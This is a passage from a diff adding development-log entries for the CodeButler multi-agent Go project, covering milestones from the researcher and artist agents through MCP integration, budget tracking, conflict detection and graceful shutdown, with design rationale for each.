+ensures the contract is bidirectional: the sender produces the right message
+and the receiver gets the right input.
+
+### What's next
+
+Phase 7 is complete. Phase 8 (Support Agents) adds Researcher and Artist.
+Phase 9+ covers Decision Log, Multi-Model, MCP, Observability, and Polish.
+
+---
+
+## 2026-02-25 — M22: Researcher Agent
+
+### What was built
+
+Researcher agent (`internal/agent/researcher.go`) and web tools
+(`internal/tools/tool_web.go`).
+
+**WebSearch/WebFetch tools** — injectable via `WebSearcher` and `WebFetcher`
+interfaces. WebSearch returns structured `[]SearchResult` (title, URL, snippet).
+WebFetch returns page content as text with 50KB truncation. Both are Read-tier.
+
+**ResearcherRunner** — wraps `AgentRunner`, `Research()` method builds a
+structured prompt instructing the model to: check existing research first,
+search, fetch, synthesize, optionally persist, and reply to the requester.
+
+**Research protocol helpers**:
+- `FormatResearchFindings` — produces the spec output format
+- `ParseResearchFindings` — extracts findings from model responses
+- `ResearchTopicSlug` — generates filename-safe slugs for persistence
+
+### What's next
+
+M23 (Artist Agent) completes Phase 8 with all six agents operational.
+
+---
+
+## 2026-02-25 — M23: Artist Agent
+
+### What was built
+
+Artist agent (`internal/agent/artist.go`), OpenAI image client
+(`internal/provider/openai/images.go`), and image tools
+(`internal/tools/tool_image.go`).
+
+**OpenAI Image Client** — `ImageClient` interface with `Generate` and `Edit`
+methods. `Client` struct uses injectable `HTTPDoer` interface for testability.
+Supports configurable base URL, authenticated requests with Bearer tokens,
+and structured request/response types (`ImageGenerateRequest`,
+`ImageEditRequest`, `ImageResponse`). The client targets OpenAI's
+`gpt-image-1` model for high-quality image generation.
+
+**GenerateImage + EditImage tools** — Both `WRITE_LOCAL` tier. `GenerateImage`
+takes prompt, size, quality, and output path; delegates to `ImageGenerator`
+interface. `EditImage` takes image path, mask path, prompt, size, and output
+path; delegates to `ImageEditor` interface. Both validate required fields and
+return structured results with the saved file path.
+
+**ArtistRunner** — Wraps `AgentRunner` with a `Design()` method that builds
+a structured UX design prompt. The design protocol instructs the model to:
+1. Check existing UI patterns in the assets directory (if configured)
+2. Produce a structured UX proposal with layout, components, interaction,
+   responsive behavior, and notes for the Coder agent
+3. Optionally generate mockup images
+
+**Design proposal types**:
+- `DesignProposal` — top-level: feature, layout, components, interaction,
+  responsive spec, coder notes, generated images
+- `ComponentSpec` — name, purpose, states, props
+- `ResponsiveSpec` — desktop, tablet, mobile breakpoint descriptions
+
+**Round-trip formatting**:
+- `FormatDesignPrompt` — builds the design request prompt with optional
+  assets directory exploration instruction
+- `FormatDesignProposal` — serializes a `DesignProposal` to the text format
+  the spec defines (sections for layout, components with states, interaction,
+  responsive, coder notes, images)
+- `ParseDesignProposal` — extracts structured data from model response text
+  by parsing section headers and bullet points
+
+### Design decisions
+
+**Separate image client from OpenRouter.** Image generation uses OpenAI's
+direct API, not OpenRouter. This is by design — OpenRouter is for chat
+completions, OpenAI is for image generation. The two clients have completely
+different request/response formats and authentication flows. Keeping them
+separate avoids a forced abstraction that would complicate both.
+
+**Injectable HTTPDoer.** The image client accepts an `HTTPDoer` interface
+(`Do(*http.Request) (*http.Response, error)`) rather than a concrete
+`*http.Client`. This lets tests inject a mock HTTP transport without needing
+an `httptest.Server`, making tests fast and deterministic.
+
+**WRITE_LOCAL tier for image tools.** Image generation creates files on disk
+but doesn't interact with external services visible to users (no Slack posts,
+no PRs). `WRITE_LOCAL` is the appropriate tier — it's higher than `READ` but
+lower than `WRITE_VISIBLE`.
+
+**Design proposal as structured text, not JSON.** The UX proposal format uses
+markdown-like sections (Layout, Components, Interaction, etc.) rather than
+JSON. This is intentional — the output is consumed by both humans (in Slack)
+and the Coder agent (as context). Structured text is readable in both
+contexts. The `ParseDesignProposal` function handles extraction when
+programmatic access is needed.
+
+### What's next
+
+Phase 8 is complete — all six agents are operational. Phase 9 adds MCP
+integration (M24), multi-model fan-out (M25), and the decision log (M26).
+
+---
+
+## 2026-02-25 — M24: MCP Integration
+
+### What was built
+
+MCP (Model Context Protocol) client and server lifecycle management
+(`internal/mcp/`), enabling agents to use external tool servers.
+
+**Config parser** (`config.go`) — Reads `.codebutler/mcp.json`, resolves
+`${VAR}` environment variables, and filters servers by agent role. Missing
+file is not an error — agent starts with zero MCP tools. Empty `roles` array
+means all roles get access.
+
+**JSON-RPC 2.0 client** (`client.go`) — Communicates with MCP servers over
+stdio using newline-delimited JSON-RPC 2.0. Supports `initialize` handshake
+(protocol version `2024-11-05`), `tools/list` discovery, and `tools/call`
+execution. Uses a read loop goroutine to dispatch responses to pending
+requests via channels. Context cancellation works for all calls.
+
+**Server manager** (`manager.go`) — Manages the full lifecycle of MCP server
+child processes:
+1. Start: spawn process, create stdio pipes, initialize, discover tools
+2. Call: route tool calls to correct server with timeout (30s default)
+3. Stop: SIGTERM → 5s grace period → SIGKILL
+
+Failed server starts are logged and skipped — not fatal. Crashed servers have
+their tools removed from the registry. The `ProcessStarter` interface
+abstracts process creation for testability.
+
+**Merged tool registry** (`registry.go`) — Combines native tools from
+`internal/tools.Registry` with MCP tools from the manager. Native tools win
+on name collision (logged as warning). The `Execute` method routes calls to
+either native or MCP execution transparently. `DiscoverTools()` refreshes
+the MCP tool mapping after servers start.
+
+### Design decisions
+
+**JSON-RPC 2.0 over stdio, not HTTP.** MCP specifies stdio transport. The
+client sends newline-delimited JSON to stdin and reads newline-delimited
+JSON from stdout. This avoids port allocation, firewall issues, and the
+complexity of HTTP server lifecycle — the child process is the server.
+
+**ProcessStarter interface for testing.** The manager accepts a
+`ProcessStarter` interface that abstracts `exec.Command` + pipe creation.
+Tests inject mock starters that use `io.Pipe` instead of real OS processes.
+This makes tests fast (~70ms for 29 tests) and avoids needing real MCP
+server binaries in CI.
+
+**Read loop goroutine with channel dispatch.** The client runs a background
+goroutine that continuously reads from stdout and dispatches responses to
+pending request channels by JSON-RPC ID. This cleanly separates reading from
+request/response correlation and handles context cancellation correctly —
+the `call` method uses `select` on the response channel and context.
+
+**Merged registry wraps rather than extends.** `MergedRegistry` holds a
+reference to the native `tools.Registry` and the MCP `Manager` rather than
+inheriting from either. This keeps the native registry unchanged and avoids
+coupling the general tool system to MCP concerns.
+
+### What's next
+
+M25 (Multi-Model Fan-Out) and M26 (Decision Log) complete Phase 9.
+
+---
+
+## 2026-02-26 — M25: Multi-Model Fan-Out
+
+### What was built
+
+Multi-model fan-out package (`internal/multimodel/`) enabling parallel
+single-shot LLM calls to different models — the engine behind brainstorming,
+multi-perspective code review, and any use case needing diverse model
+perspectives.
+
+**Types** (`types.go`) — `ThinkerConfig` (name, system prompt, model),
+`ThinkerResult` (response, tokens, duration, error), `FanOutCost` with
+per-thinker cost breakdown, `FanOutConfig` (pool, max agents, cost limit),
+`FanOutRequest`/`FanOutResponse`.
+
+**Fan-out execution** (`fanout.go`) — `FanOut()` launches N goroutines via
+`errgroup`, each making a single `ChatCompletion` call with a custom system
+prompt and the shared user prompt. Errors don't propagate — one model failing
+doesn't cancel the others. `Validate()` enforces: no duplicate models (model
+diversity is the whole point), pool membership (when pool is configured),
+max agents per round, non-empty names/prompts. `CheckCostLimit()` estimates
+cost before execution and compares against the soft limit.
+
+**Cost estimation** (`cost.go`) — Model pricing table with per-million-token
+rates for Anthropic, OpenAI, Google, DeepSeek, and Moonshot models.
+`EstimateCost()` uses prompt character length as a rough token proxy.
+`CalculateFanOutCost()` aggregates actual costs from real token usage after
+execution. Wall clock time is max(durations) since calls run in parallel.
+
+### Design decisions
+
+**errgroup, not raw goroutines.** `errgroup.WithContext` gives us structured
+concurrency — all goroutines share a cancellation context. Individual errors
+return `nil` to the group (so others continue), but if the parent context
+is cancelled (user timeout), all goroutines see it immediately.
+
+**Separate LLMProvider interface.** The multimodel package defines its own
+`LLMProvider` interface (`ChatCompletion(ctx, ChatRequest) (*ChatResponse, error)`)
+rather than importing `agent.LLMProvider`. This avoids a circular dependency
+— the multimodel package doesn't need to know about the agent package. An
+adapter at the call site bridges the two interfaces.
+
+**Cost as estimation, not billing.** The pricing table is approximate and
+will drift as providers change rates. That's fine — the cost tracking is for
+budget awareness and the Lead's usage reports, not for invoicing. The key
+insight is wall clock = max(durations), not sum, since calls are parallel.
+
+### What's next
+
+M26 (Decision Log) completes Phase 9. Then Phase 10 (Observability) and
+Phase 11-12 (Polish, Docs).
+
+---
+
+## 2026-02-26 — M26: Decision Log
+
+### What was built
+
+Decision log package (`internal/decisions/`) — append-only JSONL logger for
+recording significant agent choice points, enabling debugging and
+retrospective analysis by the Lead.
+
+**Types** (`types.go`) — 12 decision types as typed constants:
+`workflow_selected`, `skill_matched`, `agent_delegated`, `model_selected`,
+`tool_chosen`, `stuck_detected`, `escalated`, `plan_deviated`,
+`review_issue`, `learning_proposed`, `compaction_triggered`,
+`circuit_breaker`. The `Decision` struct captures timestamp, agent, type,
+input, state, decision, alternatives, evidence, and optional outcome.
+
+**Logger** (`logger.go`) — Thread-safe `Logger` with `sync.Mutex` that
+serializes concurrent writes. `NewLogger` accepts any `io.Writer` for
+testability; `NewFileLogger` creates the JSONL file and parent directories.
+`Log()` sets timestamp and agent automatically, marshals to JSON, and
+appends with newline. `LogDecision()` is a convenience builder.
+
+**Reading and analysis**:
+- `ReadLog(path)` reads all decisions from a file (missing file = empty, not error)
+- `ReadFrom(reader)` parses JSONL, skipping malformed lines
+- `FilterByType`, `FilterByAgent` for selective analysis
+- `Summary` returns decision counts by type
+- `WithOutcome` returns a copy with the outcome field set
+
+### Design decisions
+
+**Append-only JSONL, not a database.** One JSON line per decision, no index,
+no schema migration. The Lead reads the full log during retrospective —
+scanning a few hundred lines is fast. JSONL is human-readable with `jq`,
+trivial to parse, and impossible to corrupt (each write is atomic at the OS
+level for reasonable line lengths).
+
+**Injectable writer, not hardcoded file.** The `Logger` accepts `io.Writer`
+so tests use `bytes.Buffer` and production uses `os.File`. Same pattern as
+every other dependency in the codebase.
+
+**Not every action is a decision.** Reading a file is an action, not a
+decision. Choosing *which* file to read when multiple candidates exist is a
+decision. The distinction matters — logging every tool call would produce
+noise. Logging only choice points produces signal the Lead can analyze.
+
+### What's next
+
+Phase 9 is complete. Phase 10 adds Roadmap System (M27), Develop Workflow
+(M28), and Learn Workflow (M29).
+
+---
+
+## 2026-02-26 — M27: Roadmap System
+
+### What was built
+
+Roadmap package (`internal/roadmap/`) — parser, status tracking, and
+dependency resolution for `.codebutler/roadmap.md`.
+
+**Parser** (`parser.go`) — Regex-based markdown parser that extracts
+roadmap items from the spec-defined format (`## N. Title`, `- Status:`,
+`- Branch:`, `- Depends on:`, `- Acceptance criteria:`, `- Blocked by:`).
+`ParseString`/`Parse` for reading, `Format` for serializing back to
+markdown with round-trip fidelity. `AddItem`, `SetStatus`, `SetBranch`
+for roadmap mutations.
+
+**Dependency Graph** (`graph.go`) — `BuildGraph` constructs an adjacency
+list from item dependencies. Key methods:
+- `Unblocked()` — items that are pending with all deps done (ready to start)
+- `NewlyUnblocked(n)` — items unblocked by completing item N (for cascading)
+- `Dependents(n)` — items that directly depend on N
+- `TopologicalOrder()` — dependency-first ordering for execution
+- `CriticalPath()` — longest dependency chain (bottleneck identification)
+- `HasCycle()` — DFS-based cycle detection
+- `Stats()` + `FormatProgress()` — summary reporting
+
+### Design decisions
+
+**Regex-based parser, not a markdown AST.** The roadmap format is rigid
+(spec-defined), not free-form markdown. A few regexes match the specific
+patterns faster and more simply than a full markdown parser. The format
+round-trips through `Parse` → `Format` → `Parse` without loss.
+
+**Graph rebuilt after mutations.** Rather than maintaining incremental
+graph state, `BuildGraph` is called fresh after status changes. The
+roadmap is small (tens of items, not thousands) so the O(n) rebuild is
+trivial. This avoids the complexity of incremental graph updates and
+makes the code easier to reason about.
+
+### What's next
+
+M28 (Develop Workflow) adds unattended batch execution of the roadmap.
+M29 (Learn Workflow) closes Phase 10.
+
+---
+
+## 2026-02-26 — M28: Develop Workflow (Unattended)
+
+### What was built
+
+Roadmap orchestrator (`internal/roadmap/orchestrator.go`) — dependency-aware
+batch execution of all pending roadmap items with concurrency control.
+
+**Orchestrator** — `Run()` loops: find unblocked items, launch up to
+`maxConcurrent` goroutines, wait for completions, cascade to newly-unblocked
+items, repeat until nothing is pending or active. Each item runs via an
+`ItemWorker` callback (dependency injection for the actual PM→Coder flow).
+`StatusReporter` callback posts progress to the orchestration thread.
+
+**Failure isolation** — If an item fails, it's marked `blocked` but
+independent items continue. Items that depend on a blocked item stay
+`pending` (their deps aren't satisfied). The orchestrator tracks completed,
+failed, and active counts separately.
+
+**Progress reporting** — `FormatProgress()` shows each item with status
+icon, title, branch (if completed), and error message (if failed), plus
+aggregate stats via `RoadmapStats.FormatProgress()`.
+
+### Design decisions
+
+**Polling loop, not event-driven.** The orchestrator uses a 100ms poll loop
+rather than channels or condition variables. For a system that runs N items
+over minutes/hours, 100ms granularity is invisible. A channel-based design
+would be more elegant but harder to reason about — especially the cascading
+dependency resolution after completions.
+
+**ItemWorker as callback.** The orchestrator doesn't know about agents,
+Slack, or PRs. It just calls `ItemWorker(ctx, item) (branch, error)`.
+This makes it testable with mock workers and keeps the roadmap package
+independent of the agent package.
+
+### What's next
+
+M29 (Learn Workflow) completes Phase 10.
+
+---
+
+## 2026-02-26 — M29: Learn Workflow
+
+### What was built
+
+Learn workflow (`internal/agent/learn.go`) — three-phase onboarding and
+knowledge refresh process where all agents explore the codebase from their
+perspective, then the Lead synthesizes shared knowledge into `global.md`.
+
+**LearnWorkflow coordinator** — orchestrates the three phases via injected
+`LearnExplorer` and `LearnSynthesizer` interfaces. Phase 1: PM maps the
+project (structure, features, domains). Phase 2: technical agents (Coder,
+Reviewer, Artist) explore in parallel via errgroup, each reading the PM's
+map as starting context. Phase 3: Lead synthesizes all findings into
+`global.md`.
+
+**Auto-detection** — `NeedsLearn()` checks if the repo has code files but
+empty `global.md`, indicating a first run on an existing codebase.
+
+**Re-learn support** — `IsRelearn` flag triggers compaction mode where
+agents compare existing project maps with fresh findings. `CompactKnowledge()`
+builds a prompt for intelligent merging (remove outdated, update changed,
+add new).
+
+**Per-role prompts** — `FormatLearnPrompt()` generates role-specific
+exploration instructions: PM focuses on features/domains, Coder on
+architecture/patterns, Reviewer on quality/CI, Artist on UI/design.
+
+### Design decisions
+
+**Three phases, not all parallel.** Phase 1 (PM maps) must complete before
+Phase 2 (agents explore) because the PM's map gives technical agents
+context. Without it, agents might duplicate effort or miss important areas.
+Phase 2 runs fully parallel since agents explore independent perspectives.
+
+**Partial failures in Phase 2 don't cancel.** If the Reviewer's exploration
+fails, the Coder and Artist continue. The Lead synthesizes from whatever
+succeeded. The result includes error annotations for failed explorations.
+
+### What's next
+
+Phase 10 is complete. Phase 11 adds init wizard (M30), CLI commands (M31).
+Phase 12 adds cost controls (M32), conflict detection (M33), testing (M34),
+and graceful shutdown (M35).
+
+---
+
+## 2026-02-26 — M30: codebutler init Wizard
+
+### What was built
+
+Init wizard (`internal/initwiz/`) — three-step first-time setup for
+CodeButler on a new repo.
+
+**Step 1: Global tokens** — Creates `~/.codebutler/config.json` with
+placeholder fields for Slack bot/app tokens, OpenRouter key, and OpenAI key.
+Skips if the file already exists (idempotent).
+
+**Step 2: Repo setup** — Seeds `.codebutler/` directory with: `config.json`
+(per-repo with default models for all 6 agents), `mcp.json` (empty servers),
+agent MDs (pm, coder, reviewer, researcher, artist, lead, global, workflows),
+`roadmap.md`, and subdirectories (skills, branches, images, research).
+Updates `.gitignore` with CodeButler-specific entries (idempotent — no
+duplicates). Skips if `.codebutler/` already exists.
+
+**Step 3: Service install** — Detects OS (darwin/linux) and generates
+service configs. `GenerateServiceConfig()` produces LaunchAgent plists for
+macOS and systemd user units for Linux, both with auto-restart.
+
+**Validation** — `Validate()` checks that all required files exist (global
+config, repo config, required agent MDs).
+
+### Design decisions
+
+**Idempotent steps.** Each step checks if its output already exists before
+acting. Running `codebutler init` twice is safe — it skips already-completed
+steps. This also means the wizard works incrementally if interrupted.
+
+**Prompter interface.** User interaction is abstracted behind `Prompter`
+(Prompt + Confirm methods). Tests use a mock; production will use terminal
+I/O. This keeps the wizard logic testable without terminal dependencies.
+
+---
+
+## 2026-02-26 — M31: CLI Commands
+
+### What was built
+
+Router-based CLI command dispatch system (`internal/cli/`) with service
+management for all six agents across macOS and Linux.
+
+**Router** — `NewRouter()` creates a command registry. `Register()` adds
+commands with name, description, and run function. `Dispatch()` matches
+the first arg to a command name and passes remaining args. `HasCommand()`,
+`ListCommands()`, and `Usage()` support introspection and help text.
+
+**ServiceManager** — OS-aware service management for agent processes.
+`Start()` launches all agents via launchd (macOS) or systemd (Linux).
+`Stop()` stops them. `Status()` returns a `[]ServiceStatus` with role,
+running state, PID, and error info. Platform detection uses `runtime.GOOS`.
+
+**FormatStatus** — Pretty-prints service status with role, state
+(running/stopped), PID, and error messages.
+
+**FindBinary** / **FindRepoDir** — Utility functions for locating the
+codebutler binary and repo root.
+
+### Design decisions
+
+**Router pattern over cobra.** The CLI needs are simple: a few subcommands
+with straightforward args. A custom Router with `Register`/`Dispatch` keeps
+the dependency footprint minimal while supporting the six commands (configure,
+start, stop, status, validate, --role). If complexity grows, this can be
+swapped for cobra later.
+
+**ServiceManager abstraction.** Both launchd and systemd share the same
+interface (`Start`/`Stop`/`Status`) with OS-specific backends selected at
+runtime via `runtime.GOOS`. Labels follow `com.codebutler.<role>` for macOS
+and `codebutler-<role>` for Linux, matching the conventions each init system
+expects.
+
+**AgentRoles as package-level slice.** The canonical list of six roles lives
+in `cli.AgentRoles` — a single source of truth for iteration in start/stop/
+status commands rather than duplicating the list in each function.
+
+---
+
+## 2026-02-26 — M32: Token Budgets & Cost Controls
+
+### What was built
+
+Thread-safe budget tracking system (`internal/budget/`) that enforces
+per-thread and per-day spending limits across all agents.
+
+**Tracker** — Central coordinator. `Record()` logs each LLM call with
+model, tokens, and computed USD cost. Checks thread and daily limits after
+each recording — returns `*BudgetExceeded` if either is exceeded. Thread
+gets `Paused=true`, daily gets `Exhausted=true`. `ResumeThread()` unpauses
+after user approval. `CheckThread()` and `CheckDaily()` return remaining
+budget and pause/exhaustion status.
+
+**Persistence** — `Save()` writes thread budgets to
+`<dataDir>/budgets/<threadID>.json` using atomic write (temp+rename).
+`Load()` reads them back. Supports crash recovery — agents can restore
+budget state on restart.
+
+**Cost estimation** — `EstimateCost()` and `CostEstimate` struct let PM
+include cost projections in plans before execution. `EstimatePlanCost()`
+sums across plan steps. `FormatCostEstimate()` renders a markdown table.
+
+**Formatting** — `FormatCostSummary()` renders per-thread breakdown
+(per-agent tokens/cost, percentage of limit, paused status).
+`FormatDailySummary()` shows daily totals with API call count.
+
+### Design decisions
+
+**Duplicated pricing table from multimodel.** Both packages need model
+prices but importing multimodel from budget would create a tight coupling.
+The pricing data is small and stable — duplication is cheaper than an
+abstraction that exists only to share 10 lines of data.
+
+**Record-then-check pattern.** Budget enforcement happens after recording,
+not before. This means the last call that exceeds the budget still gets
+recorded (so cost tracking stays accurate) but future calls are blocked.
+This avoids the TOCTOU race where checking before would allow a call
+that's already over budget by the time it completes.
+
+**Injectable Clock.** Time is injected via a `Clock` interface — tests
+use `fixedClock` for deterministic date-based behavior (daily budgets
+key on YYYY-MM-DD strings). Production uses `realClock`.
+
+---
+
+## 2026-02-26 — M33: Conflict Detection & Merge Coordination
+
+### What was built
+
+Thread-safe conflict detector (`internal/conflicts/`) that identifies
+file and directory overlaps between active development threads and
+suggests merge ordering.
+
+**Detector** — `Register()` tracks files modified by each thread.
+`DetectOverlaps()` does pairwise comparison across all threads.
+`DetectForThread()` checks a single thread against all others.
+`Update()` refreshes a thread's file list (called after Coder changes).
+`Unregister()` removes a thread when merged/closed.
+
+**Overlap types** — File overlap (high severity): exact same file modified
+by two threads. Directory overlap (medium): files in same directory but
+different files — suppressed when a file overlap already covers that
+directory. Semantic overlap (medium): PM-driven analysis added via
+`AddSemanticOverlap()`.
+
+**Merge ordering** — `SuggestMergeOrder()` sorts threads by file count
+(smallest first) and marks threads that need rebase because they share
+files with an earlier-priority merge.
+
+### Design decisions
+
+**Pairwise comparison.** With typically <10 concurrent threads, O(n^2)
+comparison is negligible. No need for inverted index or bloom filters.
+
+**Directory overlap suppression.** If `src/api/handler.go` has a file
+overlap, we don't also report `src/api` as a directory overlap — that
+would be noise. Only report directory overlaps when there's no file
+overlap in that directory.
+
+**Smallest-first merge order.** Merging the smallest changeset first
+minimizes the rebase surface for subsequent merges. The `NeedsRebase`
+flag tells agents which merges will require rebasing.
+
+---
+
+## 2026-02-26 — M34: Comprehensive Testing
+
+### What was built
+
+Integration test package (`internal/integration/`) with mock external
+services and benchmarks across all major subsystems.
+
+**Mock OpenRouter** — HTTP test server that returns configurable responses
+(text or tool calls). Tracks call count. Thread-safe for concurrent access.
+Supports multiple sequential responses.
+
+**Mock Slack** — HTTP test server for `chat.postMessage` and `reactions.add`.
+Records all messages for assertion. Thread-safe.
+
+**Benchmarks** — Performance baselines for:
+- Conversation save/load: ~1.4ms per save+load cycle (20 messages)
+- Decision logging: ~14µs per write
+- Budget tracking: ~1.9µs per record
+- Conflict detection: ~98µs for 10 threads with overlaps
+- Roadmap parsing: ~5.2µs per parse
+- Skill parsing: ~3.9µs per parse
+- Cost calculation: ~8ns (zero allocs)
+
+**CI pipeline** — `scripts/ci.sh` runs vet, tests, coverage report,
+benchmarks, and build in sequence.
+
+### Design decisions
+
+**Integration tests use httptest, not process mocks.** `httptest.NewServer`
+gives us a real HTTP server on localhost with automatic cleanup. No need
+for mock processes or container dependencies.
+
+**Benchmarks use short benchtime.** CI runs with `-benchtime=100ms` to
+keep the pipeline fast while still getting stable numbers. Developers
+can run longer benchmarks locally.
+
+---
+
+## 2026-02-26 — M35: Graceful Shutdown & Recovery
+
+### What was built
+
+Lifecycle manager (`internal/lifecycle/`) for graceful shutdown and
+crash recovery of agent processes.
+
+**Manager** — `Run()` installs SIGTERM/SIGINT handlers and runs the main
+agent function with a cancellable context. On signal: cancels root context
+(all goroutines wind down), runs shutdown hooks in registration order with
+a grace period deadline, then exits. On normal return or error: runs hooks
+with a short timeout and returns appropriate exit code.
+
+**Shutdown hooks** — `OnShutdown(name, fn)` registers cleanup functions
+that run during shutdown (save conversations, flush logs, close MCP
+servers). Hooks run in order; a failed hook logs an error but doesn't
+block subsequent hooks. Idempotent — calling `gracefulShutdown()` twice
+only runs hooks once.
+
+**Recovery** — `RecoverAgent()` builds a `RecoveryState` from the list
+of active worktrees and conversation file existence. Interfaces:
+`WorktreeReconciler` (list worktrees, check thread existence),
+`ConversationLoader` (check conversation file), `MentionScanner`
+(find unresponded @mentions). These let the agent pick up pending
+work on restart.
+
+### Design decisions
+
+**Signal-driven, not timer-driven.** Shutdown triggers only on
+SIGTERM/SIGINT, not on periodic health checks. The service manager
+(systemd/launchd) handles restart-on-crash. The lifecycle package
+handles in-process cleanup.
+
+**Hooks over embedded shutdown logic.** Rather than building shutdown
+logic for conversations, MCP servers, and Slack connections into the
+lifecycle package, each subsystem registers its own hook. This keeps
+lifecycle generic and avoids importing every subsystem.
+
+**Recovery state as data, not behavior.** `RecoverAgent()` returns a
+`RecoveryState` struct describing what needs to be done, not a function
+that does it. The caller decides what to resume based on the recovery
+report. This makes recovery testable and inspectable.
+
+---
+
+## 2026-02-26 — Roadmap Complete
+
+All 35 milestones across 12 phases implemented. The CodeButler codebase
+now has:
+
+- 24 internal packages with tests
+- Agent loop with safety (stuck detection, escape strategies, compaction)
+- Slack integration (Socket Mode, Block Kit, thread routing, redaction)
+- Git worktree management with GC
+- Skill system (parser, validator, hot-reload)
+- All 6 agents (PM, Coder, Reviewer, Researcher, Artist, Lead)
+- MCP integration (stdio JSON-RPC, merged registry)
+- Multi-model fan-out for brainstorm workflow
+- Decision logging (JSONL)
+- Roadmap system with dependency graph and orchestrator
+- Learn workflow (3-phase parallel exploration)
+- Init wizard (3-step, cross-platform)
+- CLI commands (router, service management)
+- Budget tracking (per-thread, per-day, cost estimation)
+- Conflict detection (file, directory, semantic overlaps)
+- Integration tests and benchmarks
+- Graceful shutdown and recovery
